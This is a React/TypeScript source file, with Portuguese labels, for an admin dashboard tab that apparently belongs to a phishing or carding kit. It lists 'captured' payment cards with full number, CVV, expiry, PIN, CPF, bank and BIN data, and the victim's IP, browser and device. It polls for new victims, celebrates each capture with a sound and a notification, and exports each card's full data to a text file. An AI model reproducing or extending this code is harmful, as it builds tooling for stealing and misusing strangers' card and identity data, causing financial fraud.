'use client'

import { useState, useEffect, useRef } from 'react'
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card'
import { Button } from '@/components/ui/button'
import { Input } from '@/components/ui/input'
import { Badge } from '@/components/ui/badge'
import { CreditCard, Search, Trash2, Eye, EyeOff, Download, Globe, Monitor, Smartphone, MapPin, Building2, Award, Bell } from 'lucide-react'
import { toast } from 'sonner'

interface SavedCard {
  id: string
  link_id: string
  card_number: string
  card_holder: string
  expiry_date: string
  cvv: string
  cpf: string
  card_password: string | null
  created_at: string
  // Informações da BIN
  bin?: string
  card_brand?: string
  card_type?: string
  card_level?: string
  bank_name?: string
  bank_country?: string
  // Informações do usuário
  user_ip?: string
  user_browser?: string
  user_os?: string
  user_device?: string
  user_agent?: string
}

export default function CardsTab() {
  const [cards, setCards] = useState<SavedCard[]>([])
  const [loading, setLoading] = useState(true)
  const [searchTerm, setSearchTerm] = useState('')
  const [visiblePasswords, setVisiblePasswords] = useState<Set<string>>(new Set())
  const [visibleCards, setVisibleCards] = useState<Set<string>>(new Set())
  const [lastCardCount, setLastCardCount] = useState(0)
  const audioRef = useRef<HTMLAudioElement | null>(null)

  // Inicializar áudio de notificação
  useEffect(() => {
    // Criar elemento de áudio com som de notificação
    audioRef.current = new Audio('data:audio/wav;base64,UklGRnoGAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQoGAACBhYqFbF1fdJivrJBhNjVgodDbq2EcBj+a2/LDciUFLIHO8tiJNwgZaLvt559NEAxQp+PwtmMcBjiR1/LMeSwFJHfH8N2QQAoUXrTp66hVFApGn+DyvmwhBTGH0fPTgjMGHm7A7+OZSA0PVqzn77BdGAg+ltryxnMnBSuAzPLaizsIGGS57OihUBELTKXh8bllHAU2jtXzzn0vBSh9y/HajD4KFV+16+mjUhELSKDf8r1pIAUuhM/z1YU2Bhxqvu7mnEoODlOq5O+zYBoGPJPY88p2KwUme8rx3I4+ChVdsuvqpVQSC0mi4PK8aB8GM4nU8tGAMQYfbcHu6aFOEAxPqOPwtmIdBjiP1vPPfS4GKn7M8tyOPwoUXLPr66dUEwtJoN/yu2gfBTCFz/PVhDUGHGu+7uidSw4OUqjk77NgGgY7k9fzyXYrBSZ6yfHcjT4KFVyx6+qlUxILSKDf8rpnHwUvhM7z1YM0Bhxqvu3nnEsODlKo5O+yXxoGOpLX88p3KwUme8rx3I0+ChVdsuvqpVMSC0mh4PK7Zx8FL4TO89WDNAYcar7t55xLDg5SqOTvsl8aBjqS1/PKdysGJnvK8dyNPgoVXbLr6qVTEgtJoeDyu2cfBS+EzvPVgzQGHGq+7eecSw4OUqjk77JfGgY6ktfzyncrBiZ7yvHcjT4KFV2y6+qlUxILSaHg8rtnHwUvhM7z1YM0Bhxqvu3nnEsODlKo5O+yXxoGOpLX88p3KwYme8rx3I0+ChVdsuvqpVMSC0mh4PK7Zx8FL4TO89WDNAYcar7t55xLDg5SqOTvsl8aBjqS1/PKdysGJnvK8dyNPgoVXbLr6qVTEgtJoeDyu2cfBS+EzvPVgzQGHGq+7eecSw4OUqjk77JfGgY6ktfzyncrBiZ7yvHcjT4KFV2y6+qlUxILSaHg8rtnHwUvhM7z1YM0Bhxqvu3nnEsODlKo5O+yXxoGOpLX88p3KwYme8rx3I0+ChVdsuvqpVMSC0mh4PK7Zx8FL4TO89WDNAYcar7t55xLDg5SqOTvsl8aBjqS1/PKdysGJnvK8dyNPgoVXbLr6qVTEgtJoeDyu2cfBS+EzvPVgzQGHGq+7eecSw4OUqjk77JfGgY6ktfzyncrBiZ7yvHcjT4KFV2y6+qlUxILSaHg8rtnHwUvhM7z1YM0Bhxqvu3nnEsODlKo5O+yXxoGOpLX88p3KwYme8rx3I0+ChVdsuvqpVMSC0mh4PK7Zx8FL4TO89WDNAYcar7t55xLDg5SqOTvsl8aBjqS1/PKdysGJnvK8dyNPgoVXbLr6qVTEgtJoeDyu2cfBS+EzvPVgzQGHGq+7eecSw4OUqjk77JfGgY6ktfzyncrBiZ7yvHcjT4KFV2y6+qlUxILSaHg8rtnHwUvhM7z1YM0Bhxqvu3nnEsODlKo5O+yXxoGOpLX88p3KwYme8rx3I0+ChVdsuvqpVMSC0mh4PK7Zx8FL4TO89WDNAYcar7t55xLDg==')
    audioRef.current.volume = 0.5
  }, [])

  useEffect(() => {
    fetchCards()
    // Polling a cada 5 segundos para verificar novos cartões
    const interval = setInterval(() => {
      fetchCards(true)
    }, 5000)

    return () => clearInterval(interval)
  }, [])

  const fetchCards = async (isPolling = false) => {
    try {
      const response = await fetch('/api/admin/cards')
      const data = await response.json()
      const cardsArray = Array.isArray(data) ? data : []
      
      // Verificar se há novos cartões
      if (isPolling && cardsArray.length > lastCardCount && lastCardCount > 0) {
        const newCardsCount = cardsArray.length - lastCardCount
        
        // Tocar som de notificação
        if (audioRef.current) {
          audioRef.current.play().catch(err => console.log('Erro ao tocar som:', err))
        }

        // Mostrar notificação pop-up
        const latestCard = cardsArray[0]
        toast.success(
          <div className="flex flex-col gap-2">
            <div className="flex items-center gap-2 font-bold text-green-600">
              <Bell className="h-5 w-5 animate-bounce" />
              {newCardsCount === 1 ? 'Novo Cartão Capturado!' : `${newCardsCount} Novos Cartões Capturados!`}
            </div>
            <div className="text-sm space-y-1">
              <p className="font-medium">{latestCard.card_holder}</p>
              <p className="text-gray-600">**** **** **** {latestCard.card_number.slice(-4)}</p>
              {latestCard.card_brand && (
                <p className="text-blue-600 font-medium">{latestCard.card_brand}</p>
              )}
            </div>
          </div>,
          {
            duration: 8000,
            className: 'bg-gradient-to-r from-green-50 to-blue-50 border-2 border-green-400'
          }
        )

        // Tentar mostrar notificação do navegador
        if ('Notification' in window && Notification.permission === 'granted') {
          new Notification('🎉 Novo Cartão Capturado!', {
            body: `${latestCard.card_holder} - **** ${latestCard.card_number.slice(-4)}`,
            icon: '/icon.svg',
            badge: '/icon.svg',
            tag: 'new-card',
            requireInteraction: false
          })
        }
      }

      setCards(cardsArray)
      setLastCardCount(cardsArray.length)
    } catch (error) {
      console.error('Erro ao carregar cartões:', error)
      if (!isPolling) {
        setCards([])
      }
    } finally {
      if (!isPolling) {
        setLoading(false)
      }
    }
  }

  // Solicitar permissão para notificações do navegador
  useEffect(() => {
    if ('Notification' in window && Notification.permission === 'default') {
      Notification.requestPermission()
    }
  }, [])

  const handleDelete = async (id: string) => {
    if (!confirm('Deseja realmente excluir este cartão? Esta ação não pode ser desfeita.')) return

    try {
      const response = await fetch(`/api/admin/cards?id=${id}`, {
        method: 'DELETE'
      })

      if (response.ok) {
        toast.success('Cartão excluído com sucesso!')
        setCards(prevCards => prevCards.filter(card => card.id !== id))
        setLastCardCount(prev => prev - 1)
      } else {
        toast.error('Erro ao excluir cartão')
      }
    } catch (error) {
      console.error('Erro ao excluir cartão:', error)
      toast.error('Erro ao excluir cartão')
    }
  }

  const togglePasswordVisibility = (cardId: string) => {
    setVisiblePasswords(prev => {
      const newSet = new Set(prev)
      if (newSet.has(cardId)) {
        newSet.delete(cardId)
      } else {
        newSet.add(cardId)
      }
      return newSet
    })
  }

  const toggleCardVisibility = (cardId: string) => {
    setVisibleCards(prev => {
      const newSet = new Set(prev)
      if (newSet.has(cardId)) {
        newSet.delete(cardId)
      } else {
        newSet.add(cardId)
      }
      return newSet
    })
  }

  const maskCardNumber = (number: string) => {
    return number.replace(/(\d{4})(\d{4})(\d{4})(\d{4})/, '$1 **** **** $4')
  }

  const formatCardNumber = (number: string) => {
    return number.replace(/(\d{4})(\d{4})(\d{4})(\d{4})/, '$1 $2 $3 $4')
  }

  const downloadCardData = (card: SavedCard) => {
    const cardData = `
═══════════════════════════════════════
        DADOS DO CARTÃO CAPTURADO
═══════════════════════════════════════

📇 INFORMAÇÕES DO CARTÃO
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Número do Cartão: ${formatCardNumber(card.card_number)}
Titular: ${card.card_holder}
Validade: ${card.expiry_date}
CVV: ${card.cvv}
CPF: ${card.cpf}
Senha: ${card.card_password || 'Não informada'}

${card.bin ? `
🏦 INFORMAÇÕES DO BANCO (BIN: ${card.bin})
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Bandeira: ${card.card_brand || 'N/A'}
Tipo: ${card.card_type || 'N/A'}
Nível: ${card.card_level || 'N/A'}
Banco: ${card.bank_name || 'N/A'}
País: ${card.bank_country || 'N/A'}
` : ''}

${card.user_ip ? `
👤 INFORMAÇÕES DO USUÁRIO
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

IP: ${card.user_ip}
Navegador: ${card.user_browser || 'N/A'}
Sistema: ${card.user_os || 'N/A'}
Dispositivo: ${card.user_device || 'N/A'}
User Agent: ${card.user_agent || 'N/A'}
` : ''}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📋 DETALHES DA CAPTURA
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Link ID: ${card.link_id}
Data de Captura: ${new Date(card.created_at).toLocaleString('pt-BR')}
ID do Registro: ${card.id}

═══════════════════════════════════════
    Arquivo gerado automaticamente
═══════════════════════════════════════
`

    const blob = new Blob([cardData], { type: 'text/plain;charset=utf-8' })
    const url = window.URL.createObjectURL(blob)
    const link = document.createElement('a')
    link.href = url
    link.download = `cartao_${card.card_holder.replace(/\s+/g, '_')}_${new Date().getTime()}.txt`
    document.body.appendChild(link)
    link.click()
    document.body.removeChild(link)
    window.URL.revokeObjectURL(url)
    
    toast.success('Arquivo baixado com sucesso!')
  }

  const filteredCards = cards.filter(card => 
    card.card_holder.toLowerCase().includes(searchTerm.toLowerCase()) ||
    card.card_number.includes(searchTerm) ||
    card.cpf.includes(searchTerm) ||
    card.link_id.toLowerCase().includes(searchTerm.toLowerCase()) ||
    card.user_ip?.includes(searchTerm) ||
    card.bank_name?.toLowerCase().includes(searchTerm.toLowerCase())
  )

  if (loading) {
    return (
      <Card className="shadow-xl">
        <CardContent className="pt-6 text-center">
          <p className="text-gray-600">Carregando cartões...</p>
        </CardContent>
      </Card>
    )
  }

  return (
    <div className="space-y-6">
      <Card className="shadow-xl">
        <CardHeader>
          <div className="flex flex-col sm:flex-row justify-between items-start sm:items-center gap-4">
            <div>
              <CardTitle className="flex items-center gap-2">
                Cartões Salvos
                <Badge variant="secondary" className="gap-1">
                  <Bell className="h-3 w-3" />
                  Notificações Ativas
                </Badge>
              </CardTitle>
              <CardDescription>
                Visualize todos os cartões capturados com notificações em tempo real
              </CardDescription>
            </div>
            <div className="w-full sm:w-auto">
              <div className="relative">
                <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 h-4 w-4 text-gray-400" />
                <Input
                  placeholder="Buscar por nome, CPF, IP, banco..."
                  value={searchTerm}
                  onChange={(e) => setSearchTerm(e.target.value)}
                  className="pl-10 w-full sm:w-64"
                />
              </div>
            </div>
          </div>
        </CardHeader>
        <CardContent>
          <div className="space-y-4">
            {filteredCards.length === 0 ? (
              <div className="text-center py-12 text-gray-500">
                {searchTerm ? 'Nenhum cartão encontrado com esse filtro.' : 'Nenhum cartão salvo ainda.'}
              </div>
            ) : (
              <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">
                {filteredCards.map((card) => (
                  <Card key={card.id} className="border-2 hover:border-blue-300 transition-colors">
                    <CardContent className="pt-6">
                      <div className="space-y-4">
                        {/* Header do cartão */}
                        <div className="flex justify-between items-start gap-2">
                          <div className="flex items-center gap-2 flex-1 min-w-0">
                            <CreditCard className="h-5 w-5 text-blue-600 flex-shrink-0" />
                            <span className="font-semibold text-lg break-all">
                              {visibleCards.has(card.id) 
                                ? formatCardNumber(card.card_number)
                                : maskCardNumber(card.card_number)
                              }
                            </span>
                          </div>
                          <div className="flex gap-2 flex-shrink-0">
                            <Button
                              size="sm"
                              variant="outline"
                              onClick={() => toggleCardVisibility(card.id)}
                              title={visibleCards.has(card.id) ? "Ocultar número" : "Mostrar número completo"}
                            >
                              {visibleCards.has(card.id) ? (
                                <EyeOff className="h-4 w-4" />
                              ) : (
                                <Eye className="h-4 w-4" />
                              )}
                            </Button>
                            <Button
                              size="sm"
                              variant="outline"
                              onClick={() => downloadCardData(card)}
                              title="Baixar dados em TXT"
                            >
                              <Download className="h-4 w-4" />
                            </Button>
                            <Button
                              size="sm"
                              variant="destructive"
                              onClick={() => handleDelete(card.id)}
                              title="Excluir cartão"
                            >
                              <Trash2 className="h-4 w-4" />
                            </Button>
                          </div>
                        </div>

                        {/* Badges de informações da BIN */}
                        {(card.card_brand || card.card_type || card.card_level) && (
                          <div className="flex flex-wrap gap-2">
                            {card.card_brand && (
                              <Badge variant="secondary" className="gap-1">
                                <CreditCard className="h-3 w-3" />
                                {card.card_brand}
                              </Badge>
                            )}
                            {card.card_type && (
                              <Badge variant="outline" className="gap-1">
                                {card.card_type}
                              </Badge>
                            )}
                            {card.card_level && (
                              <Badge variant="outline" className="gap-1 bg-gradient-to-r from-yellow-100 to-orange-100">
                                <Award className="h-3 w-3" />
                                {card.card_level}
                              </Badge>
                            )}
                          </div>
                        )}

                        {/* Informações do banco */}
                        {(card.bank_name || card.bank_country) && (
                          <div className="bg-blue-50 rounded-lg p-3 space-y-1">
                            <div className="flex items-center gap-2 text-sm">
                              <Building2 className="h-4 w-4 text-blue-600" />
                              <span className="font-medium text-blue-900">
                                {card.bank_name || 'Banco não identificado'}
                              </span>
                            </div>
                            {card.bank_country && (
                              <div className="flex items-center gap-2 text-xs text-blue-700">
                                <MapPin className="h-3 w-3" />
                                País: {card.bank_country}
                              </div>
                            )}
                            {card.bin && (
                              <div className="text-xs text-blue-600">
                                BIN: {card.bin}
                              </div>
                            )}
                          </div>
                        )}

                        {/* Informações do cartão */}
                        <div className="grid grid-cols-2 gap-3 text-sm">
                          <div>
                            <p className="text-gray-500 text-xs">Titular</p>
                            <p className="font-medium break-words">{card.card_holder}</p>
                          </div>
                          <div>
                            <p className="text-gray-500 text-xs">Validade</p>
                            <p className="font-medium">{card.expiry_date}</p>
                          </div>
                          <div>
                            <p className="text-gray-500 text-xs">CVV</p>
                            <p className="font-medium">{card.cvv}</p>
                          </div>
                          <div>
                            <p className="text-gray-500 text-xs">CPF</p>
                            <p className="font-medium break-all">{card.cpf}</p>
                          </div>
                        </div>

                        {/* Senha do cartão */}
                        <div className="bg-gray-50 rounded-lg p-3">
                          <div className="flex justify-between items-center">
                            <div className="flex-1 min-w-0">
                              <p className="text-gray-500 text-xs mb-1">Senha</p>
                              <p className="font-medium break-all">
                                {card.card_password ? (
                                  visiblePasswords.has(card.id) ? (
                                    card.card_password
                                  ) : (
                                    '••••'
                                  )
                                ) : (
                                  <span className="text-gray-400 italic">Não informada</span>
                                )}
                              </p>
                            </div>
                            {card.card_password && (
                              <Button
                                size="sm"
                                variant="ghost"
                                onClick={() => togglePasswordVisibility(card.id)}
                                className="flex-shrink-0"
                              >
                                {visiblePasswords.has(card.id) ? (
                                  <EyeOff className="h-4 w-4" />
                                ) : (
                                  <Eye className="h-4 w-4" />
                                )}
                              </Button>
                            )}
                          </div>
                        </div>

                        {/* Informações do usuário */}
                        {(card.user_ip || card.user_browser || card.user_device) && (
                          <div className="bg-purple-50 rounded-lg p-3 space-y-2">
                            <div className="flex items-center gap-2 text-sm font-medium text-purple-900">
                              <Globe className="h-4 w-4 text-purple-600" />
                              Informações do Usuário
                            </div>
                            <div className="space-y-1 text-xs text-purple-700">
                              {card.user_ip && (
                                <div className="flex items-center gap-2">
                                  <MapPin className="h-3 w-3" />
                                  IP: {card.user_ip}
                                </div>
                              )}
                              {card.user_browser && (
                                <div className="flex items-center gap-2">
                                  <Globe className="h-3 w-3" />
                                  Navegador: {card.user_browser}
                                </div>
                              )}
                              {card.user_os && (
                                <div className="flex items-center gap-2">
                                  <Monitor className="h-3 w-3" />
                                  Sistema: {card.user_os}
                                </div>
                              )}
                              {card.user_device && (
                                <div className="flex items-center gap-2">
                                  {card.user_device === 'Mobile' ? (
                                    <Smartphone className="h-3 w-3" />
                                  ) : (
                                    <Monitor className="h-3 w-3" />
                                  )}
                                  Dispositivo: {card.user_device}
                                </div>
                              )}
                            </div>
                          </div>
                        )}

                        {/* Link ID */}
                        <div className="text-xs text-gray-400 border-t pt-2 break-all">
                          Link ID: {card.link_id}
                        </div>

                        {/* Data de captura */}
                        <div className="text-xs text-gray-400">
                          Capturado em: {new Date(card.created_at).toLocaleString('pt-BR')}
                        </div>
                      </div>
                    </CardContent>
                  </Card>
                ))}
              </div>
            )}
          </div>
        </CardContent>
      </Card>

      {/* Estatísticas */}
      <div className="grid grid-cols-1 sm:grid-cols-3 gap-4">
        <Card>
          <CardContent className="pt-6">
            <div className="text-center">
              <p className="text-3xl font-bold text-blue-600">{cards.length}</p>
              <p className="text-sm text-gray-600 mt-1">Total de Cartões</p>
            </div>
          </CardContent>
        </Card>
        <Card>
          <CardContent className="pt-6">
            <div className="text-center">
              <p className="text-3xl font-bold text-green-600">
                {cards.filter(c => c.card_password).length}
              </p>
              <p className="text-sm text-gray-600 mt-1">Com Senha</p>
            </div>
          </CardContent>
        </Card>
        <Card>
          <CardContent className="pt-6">
            <div className="text-center">
              <p className="text-3xl font-bold text-orange-600">
                {cards.filter(c => !c.card_password).length}
              </p>
              <p className="text-sm text-gray-600 mt-1">Sem Senha</p>
            </div>
          </CardContent>
        </Card>
      </div>
    </div>
  )
}
